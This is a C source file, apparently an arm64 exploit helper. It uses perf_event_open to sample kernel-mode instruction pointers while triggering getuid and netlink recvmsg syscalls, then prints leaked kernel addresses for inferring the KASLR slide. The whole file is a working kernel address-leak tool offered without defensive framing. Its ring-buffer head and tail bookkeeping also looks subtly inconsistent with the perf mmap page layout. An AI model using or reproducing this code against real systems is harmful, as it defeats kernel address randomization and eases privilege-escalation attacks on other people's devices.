/* PMU cycle sampler: dump kernel IPs for KASLR slide inference. */
#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
struct attr_min {
    uint32_t type, size;
    uint64_t config, sample_period, sample_type, read_format, flags;
    uint32_t wakeup_events, bp_type;
    uint64_t bp_addr, bp_len;
    uint64_t branch_sample_type, sample_regs_user;
    uint32_t sample_stack_user;
    int32_t clockid;
    uint64_t sample_regs_intr;
    uint32_t aux_watermark;
    uint16_t sample_max_stack, reserved2;
    uint32_t aux_sample_size, reserved3;
};
int main(int argc, char **argv) {
    long period = argc > 1 ? atol(argv[1]) : 20000;
    int secs = argc > 2 ? atoi(argv[2]) : 5;
    struct attr_min a;
    memset(&a, 0, sizeof(a));
    a.type = 0;
    a.size = 112;
    a.config = 0;
    a.sample_period = (uint64_t)period;
    a.sample_type = 1; /* IP */
    a.flags = 1ULL << 4;
    int fd = (int)syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        printf("perf %s\n", strerror(errno));
        return 1;
    }
    size_t pg = 4096, pages = 256;
    void *ring = mmap(NULL, pg * (pages + 1), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    volatile uint64_t *meta = (volatile uint64_t *)ring;
    uint8_t *data = (uint8_t *)ring + pg;
    uint64_t mask = pg * pages - 1, tail = 0;
    int nl = socket(16, 3, 0);
    char buf[64];
    struct iovec iov = {.iov_base = buf, .iov_len = sizeof(buf)};
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;) {
        for (int i = 0; i < 500; i++) {
            syscall(174);
            syscall(SYS_recvmsg, nl, &msg, 0x40);
        }
        uint64_t head = meta[1];
        while (tail < head) {
            uint8_t *rec = data + (tail & mask);
            uint32_t type;
            uint16_t size;
            memcpy(&type, rec, 4);
            memcpy(&size, rec + 6, 2);
            if (!size)
                break;
            if (type == 9) {
                uint64_t ip;
                memcpy(&ip, rec + 8, 8);
                if (ip >= 0xffffffc000000000ULL)
                    printf("IP %#llx\n", (unsigned long long)ip);
            }
            tail += size;
        }
        meta[0] = tail;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        if (t1.tv_sec - t0.tv_sec >= secs)
            break;
    }
    return 0;
}
